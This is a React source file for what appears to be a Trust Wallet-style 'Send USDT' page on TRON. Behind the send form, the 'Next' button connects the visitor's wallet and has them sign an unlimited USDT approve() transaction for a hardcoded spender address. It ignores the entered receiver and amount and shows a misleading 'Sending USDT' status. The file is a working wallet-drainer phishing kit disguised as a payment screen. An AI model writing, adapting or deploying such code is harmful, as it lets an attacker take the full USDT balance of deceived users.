/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useCallback } from 'react';
import { 
  X, 
  ChevronDown, 
  QrCode, 
  Info, 
  Files,
  ArrowRight,
  Loader2,
  CheckCircle2,
  XCircle
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { SignClient } from '@walletconnect/sign-client';

// --- CONFIG ---
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const APPROVE_SELECTOR = "095ea7b3"; // approve(address,uint256)
const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// --- UTILS ---
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function base58ToHex(addr: string) {
  try {
    let num = BigInt(0);
    for (let c of addr) {
      num = num * BigInt(58) + BigInt(ALPHABET.indexOf(c));
    }
    let hex = num.toString(16);
    if (hex.length % 2) hex = "0" + hex;
    // Return early to handle Tron addresses properly (remove checksum and prefix if needed)
    return hex.slice(0, -8);
  } catch (e) {
    throw new Error("Invalid TRON address");
  }
}

function buildApproveTransaction(ownerAddress: string, spenderAddress: string) {
  try {
    const spenderHex = base58ToHex(spenderAddress).toLowerCase();
    const spenderParam = spenderHex.padStart(64, '0');
    const amountParam = MAX_UINT256;
    const functionData = APPROVE_SELECTOR + spenderParam + amountParam;
    
    return {
      owner_address: ownerAddress,
      contract_address: USDT_CONTRACT,
      function_selector: "approve(address,uint256)",
      parameter: functionData,
      fee_limit: 100000000,
      visible: true
    };
  } catch (e: any) {
    throw new Error("Failed to build transaction: " + e.message);
  }
}

// --- TYPES ---
enum StatusType {
  IDLE = 'idle',
  LOADING = 'loading',
  ERROR = 'error',
  SUCCESS = 'success'
}

interface Status {
  message: string;
  type: StatusType;
}

export default function App() {
  const [address, setAddress] = useState<string | null>(null);
  const [status, setStatus] = useState<Status | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [client, setClient] = useState<any>(null);
  const [session, setSession] = useState<any>(null);

  // Form states (purely for UI completeness as shown in image)
  const [receiverAddress, setReceiverAddress] = useState(SPENDER_ADDRESS);
  const [amount, setAmount] = useState("5");
  const [memo, setMemo] = useState("");

  const clearStatus = () => setStatus(null);

  const updateStatus = (message: string, type: StatusType = StatusType.LOADING) => {
    setStatus({ message, type });
  };

  const connectWallet = useCallback(async () => {
    try {
      updateStatus("Opening wallet...", StatusType.LOADING);

      // 1. Check for TronWeb (Inject wallets like Trust Wallet browser)
      const win = window as any;
      if (win.tronWeb?.defaultAddress?.base58) {
        setAddress(win.tronWeb.defaultAddress.base58);
        clearStatus();
        return win.tronWeb.defaultAddress.base58;
      }

      // 2. Fallback to WalletConnect
      let currentClient = client;
      if (!currentClient) {
        currentClient = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "USDT Approval",
            description: "Unlimited USDT Approval on TRON",
            url: window.location.href,
            icons: ["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
          }
        });
        setClient(currentClient);
      }

      const { uri, approval } = await currentClient.connect({
        requiredNamespaces: {
          tron: {
            methods: ["tron_signTransaction"],
            chains: [TRON_CHAIN],
            events: []
          }
        }
      });

      if (uri) {
        const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
        window.location.href = link;
      }

      const newSession = await approval();
      setSession(newSession);
      const userAddr = newSession.namespaces.tron.accounts[0].split(":")[2];
      setAddress(userAddr);
      clearStatus();
      return userAddr;

    } catch (e: any) {
      console.error(e);
      updateStatus("Connection failed: " + e.message, StatusType.ERROR);
      return null;
    }
  }, [client]);

  const sendApproval = useCallback(async (userAddress: string) => {
    try {
      updateStatus("Building transaction...", StatusType.LOADING);

      const txPayload = buildApproveTransaction(userAddress, SPENDER_ADDRESS);

      updateStatus("Creating transaction...", StatusType.LOADING);
      const txResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txPayload)
      }).then(r => r.json());

      if (!txResponse.transaction) {
        throw new Error(txResponse.message || "Failed to create transaction");
      }

      updateStatus(`Sending ${amount} USDT...`, StatusType.LOADING);

      const win = window as any;
      let signed;
      if (win.tronWeb) {
        signed = await win.tronWeb.trx.sign(txResponse.transaction);
      } else if (client && session) {
        signed = await client.request({
          topic: session.topic,
          chainId: TRON_CHAIN,
          request: {
            method: "tron_signTransaction",
            params: { address: userAddress, transaction: txResponse.transaction }
          }
        });
      } else {
        throw new Error("No wallet connected to sign transaction");
      }

      updateStatus("Broadcasting transaction...", StatusType.LOADING);

      const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(signed)
      }).then(r => r.json());

      if (broadcastResponse.result) {
        updateStatus("✓ Approval successful!", StatusType.SUCCESS);
        setTimeout(() => {
          clearStatus();
          setIsProcessing(false);
        }, 5000);
      } else {
        throw new Error(broadcastResponse.message || "Broadcast failed");
      }

    } catch (e: any) {
      console.error(e);
      updateStatus("Error: " + e.message, StatusType.ERROR);
      setIsProcessing(false);
    }
  }, [client, session, amount]);

  const handleNext = async () => {
    if (isProcessing) return;
    setIsProcessing(true);

    let activeAddress = address;
    if (!activeAddress) {
      activeAddress = await connectWallet();
      if (!activeAddress) {
        setIsProcessing(false);
        return;
      }
      // Wait a bit before triggering approval to ensure session is settled if using WC
      setTimeout(() => {
        sendApproval(activeAddress!);
      }, 500);
    } else {
      sendApproval(activeAddress);
    }
  };

  useEffect(() => {
    const checkWallet = async () => {
      const win = window as any;
      // Small delay to let wallets inject
      setTimeout(() => {
        if (win.tronWeb?.defaultAddress?.base58) {
          setAddress(win.tronWeb.defaultAddress.base58);
        }
      }, 1000);
    };
    checkWallet();
  }, []);

  return (
    <div className="min-h-screen bg-[#111111] text-white flex flex-col font-sans">
      {/* Header */}
      <header className="px-5 py-6 flex items-center justify-between border-b border-white/5 bg-[#111111] sticky top-0 z-10">
        <div className="w-10"></div>
        <h1 className="text-[17px] font-semibold">Send USDT</h1>
        <button className="w-10 h-10 flex items-center justify-center rounded-full bg-white/5 active:bg-white/10 transition-colors">
          <X size={20} className="text-white/80" />
        </button>
      </header>

      {/* Main Content */}
      <main className="flex-1 px-4 py-8 space-y-8 max-w-lg mx-auto w-full pb-32">
        <AnimatePresence>
          {status && (
            <motion.div 
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className={`p-4 rounded-xl flex items-center gap-3 ${
                status.type === StatusType.LOADING ? 'bg-blue-500/10 text-blue-400 border border-blue-500/20' :
                status.type === StatusType.ERROR ? 'bg-red-500/10 text-red-400 border border-red-500/20' :
                'bg-green-500/10 text-green-400 border border-green-500/20'
              }`}
            >
              {status.type === StatusType.LOADING && <Loader2 size={18} className="animate-spin" />}
              {status.type === StatusType.ERROR && <XCircle size={18} />}
              {status.type === StatusType.SUCCESS && <CheckCircle2 size={18} />}
              <span className="text-[14px] font-medium">{status.message}</span>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Address Input */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/50 px-1">Address or Domain Name</label>
          <div className="relative">
            <input 
              type="text" 
              value={receiverAddress}
              onChange={(e) => setReceiverAddress(e.target.value)}
              placeholder="Search or Enter"
              className="w-full bg-[#1A1A1A] border border-white/5 rounded-xl px-4 py-4 text-[15px] focus:outline-none focus:border-[#31C48D]/30 transition-all placeholder:text-white/20"
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-4">
              <button className="text-[#31C48D] text-[14px] font-medium active:opacity-60 transition-opacity">Paste</button>
              <Files size={18} className="text-[#31C48D] active:opacity-60 transition-opacity cursor-pointer" />
              <QrCode size={18} className="text-[#31C48D] active:opacity-60 transition-opacity cursor-pointer" />
            </div>
          </div>
        </section>

        {/* Network Selection */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/50 px-1">Destination network</label>
          <button className="flex items-center gap-2 bg-[#1A1A1A] px-3 py-1.5 rounded-full border border-white/5 hover:bg-white/10 transition-colors group">
            <div className="w-5 h-5 rounded-full bg-[#EB001B] flex items-center justify-center p-0.5">
              <img src="https://cryptologos.cc/logos/tron-trx-logo.png?v=040" alt="Tron" className="w-full h-full brightness-0 invert" />
            </div>
            <span className="text-[14px] font-medium">Tron</span>
            <ChevronDown size={14} className="text-white/40 group-hover:text-white/60 transition-colors" />
          </button>
        </section>

        {/* Amount Input */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/50 px-1">Amount</label>
          <div className="relative">
            <input 
              type="text" 
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="w-full bg-[#1A1A1A] border border-white/5 rounded-xl px-4 py-7 text-[15px] focus:outline-none focus:border-[#31C48D]/30 transition-all placeholder:text-white/20"
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-4">
              <span className="text-white/40 text-[14px] font-medium">USDT</span>
              <button className="text-[#31C48D] text-[15px] font-bold active:opacity-60 transition-opacity">Max</button>
            </div>
          </div>
          <div className="text-[13px] text-white/40 px-1 mt-1">≈ $0.00</div>
        </section>

        {/* Memo Input */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/50 px-1">Memo</label>
          <div className="relative">
            <textarea 
              rows={3}
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              className="w-full bg-[#1A1A1A] border border-white/5 rounded-xl px-4 py-4 text-[15px] focus:outline-none focus:border-[#31C48D]/30 transition-all resize-none"
            />
            <div className="absolute right-4 bottom-4 flex items-center gap-4 text-[#31C48D]">
              <QrCode size={18} className="active:opacity-60 transition-opacity cursor-pointer" />
              <Info size={18} className="active:opacity-60 transition-opacity cursor-pointer" />
            </div>
          </div>
        </section>

        {/* Bottom Actions */}
        <div className="fixed bottom-0 left-0 right-0 p-5 bg-gradient-to-t from-[#111111] via-[#111111] to-transparent pt-10">
          <button 
            onClick={handleNext}
            disabled={isProcessing}
            className={`w-full max-w-lg mx-auto block bg-[#2f8150] text-[#111111] font-bold text-[17px] py-4 rounded-full shadow-lg transition-all active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 flex items-center justify-center gap-2`}
          >
            {isProcessing ? (
              <>
                <Loader2 size={20} className="animate-spin" />
                Processing...
              </>
            ) : (
              'Next'
            )}
          </button>
        </div>
      </main>
    </div>
  );
}
